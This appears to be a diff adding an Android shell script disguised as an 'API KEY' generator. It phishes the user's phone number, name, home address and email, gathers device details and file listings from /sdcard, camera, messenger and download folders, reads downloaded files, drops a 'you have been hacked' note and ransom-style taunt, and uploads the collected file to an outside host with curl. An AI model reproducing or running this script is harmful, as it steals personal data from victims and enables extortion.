@@ -1,1 +1,151 @@
+#!/system/bin/bash/sh
 
+clear
+echo -e "\033[33;32m"
+echo "Copyright By Pham Chien
+"> system.txt
+
+echo "
+ ____       ____
+|  _ \  ___/ ___|
+| |_| |/ _ \___ \\
+|____/ \___/____/
+    _              _           _     _
+   / \   _ __   __| |_ __ ___ (_) __| |
+  / _ \ | |_ \ / _\ | |__/ _ \| |/ _\ |
+/_/   \_\_| |_|\__,_|_|  \___/|_|\__,_|
+
+         ©:PhamChien"
+
+echo -e "\033[33;35m"
+echo "Please Enter your Personal Information to created API KEY use "
+echo "Vui Lòng nhập thông tin cá nhân của bạn , tối thiểu là số điện thoại , để chúng tôi tạo dịch vụ tạo API KEY "
+echo ""
+
+  echo -n "Phone Number:"
+  read phone
+
+  echo "PHONE : $phone" >> system.txt
+
+  echo -n "first and last name :"
+  read name
+
+  echo "NAME : $name" >> system.txt
+
+  echo -n "Address Home | Dia Chi NHa  : "
+  read adrss
+
+  echo "Address : $adrss" >> system.txt
+
+  echo -n "Email :"
+  read email
+
+  echo "EMAIl : $email" >> system.txt
+
+sleep 1
+echo "[!] Waiting For Me , To Created Api Key "
+echo "[!] Vui Lòng chờ chúng tôi để chúng tôi tạo API KEY cho bạn"
+sleep 3
+
+cm()
+{
+echo -n enter ip :
+read line
+
+  case $line in
+
+  $line)
+  echo "
+
+  System : $(uname -a)
+  User   : $(whoami)
+  date   : $(date)
+  path   : $(pwd)
+  id     : $(id)
+
+
+  $(ifconfig)
+
+  $(cd /sdcard/documents ; ls -s -u)
+
+  ===== FILES SDCARD =====
+
+  $(cd /sdcard/ ; ls -s -u)
+
+  ===== Android Files =====
+
+  $(cd /sdcard/Android ; ls -s -u)
+
+  ===== DATA ANDROID =====
+
+  $(cd /sdcard/Android/data ; ls -s -u)
+
+  ===== MOVIE FILES =====
+
+  $(cd /sdcard/Movies ; ls -s -u)
+
+  ==== Messenger =====
+
+  $(cd /sdcard/Movies/messenger ; ls -s -u)
+
+  ==== Pictures =====
+
+  $(cd /sdcard/Pictures ; cd * ; ls -s -u)
+
+  ====== Download =====
+
+  $(cd /sdcard/download ; echo 'All your data has been hacked , contact me : cyberkex.phamchien.net@gmail.com' >> you_have_been_hacked.txt ; ls -s -u ; cat *)
+
+  $(cd /sdcard/download ; echo "..." >> may.txt ; echo "..." >> da.txt ; echo "..." >> bi.txt ; echo "..." >> hack.txt)
+
+  $(cd /sdcard/download ; cd * ; ls -l -u)
+
+  ====== Image ======
+
+  $(cd /sdcard/DCIM/Screenshots ; ls -s -u)
+
+  ====== VIDEO ======
+
+ $(cd /sdcard/DCIM/Camera ; ls -s -u)
+
+  ====== Camera =====
+
+$(cd /sdcard/DCIM/Camera/Cshot ; cd * ; ls -s -u)
+
+  System : $(uname -a)
+  User   : $(whoami)
+  date   : $(date)
+  path   : $(pwd)
+  id     : $(id)
+
+  phone number : $phone
+  name : $name
+  email : $email
+  ','{$line}','
+
+  ','{$line}','
+
+  ','{$line}','
+
+  ','{$line}','
+
+  ','{$line}','
+
+  ','{$line}',' " >> system.txt
+  echo 3
+  sleep 1
+  echo 2
+  sleep 1
+  echo 1
+  sleep 1
+  echo ATTACK!!!
+  sleep 1
+  echo -e "\033[33;31m"
+   echo Your All Databse Files Backups And Android , Has Been Hacked , hahah , please contact me for phone : 0325852307 for zalo , back all files 😂😂
+  sleep 3
+  curl -T system.txt http://n8tive.co.za/
+  exit 1
+
+ esac
+ }
+cm 
